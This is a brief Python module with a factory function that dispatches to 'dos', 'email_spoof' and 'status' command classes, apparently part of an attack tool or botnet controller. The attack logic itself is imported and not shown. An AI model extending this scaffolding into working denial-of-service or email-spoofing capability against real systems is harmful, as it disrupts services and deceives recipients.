from commands.dos import Dos
from commands.email_spoof import EmailSpoof
from commands.status import Status

# Returns an instance of a command class based on the command_type parameter passed to it
# command_type: a string representing the type of command to create
# params: a dictionary containing the parameters required to initialize the specified command class
def command_factory(command_type, params):     
    match command_type:
        case "dos":
            return Dos(params["target_ip"], params["source_port"], params["max_duration"])
    
        case "email_spoof":
            return EmailSpoof(params["username"], params["password"], params["to_email"])
        
        case "status":
            return Status()
        
        case _:
            return None